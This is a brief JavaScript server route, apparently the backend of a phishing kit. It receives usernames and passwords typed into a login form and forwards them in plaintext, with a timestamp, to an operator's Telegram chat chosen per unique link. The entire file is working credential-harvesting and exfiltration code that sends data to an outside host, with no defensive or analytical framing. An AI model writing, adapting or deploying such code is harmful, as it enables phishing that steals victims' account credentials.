import { getChatId } from "@/lib/db"

export async function POST(req) {
  const { username, password, uniqueId } = await req.json()
  const chatId = getChatId(uniqueId)

  if (!chatId) {
    return new Response("Invalid URL", { status: 400 })
  }

  const message = `New login attempt:
Username: ${username}
Password: ${password}
Time: ${new Date().toLocaleString()}`

  try {
    await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
    return new Response("OK")
  } catch (error) {
    return new Response("Error", { status: 500 })
  }
}

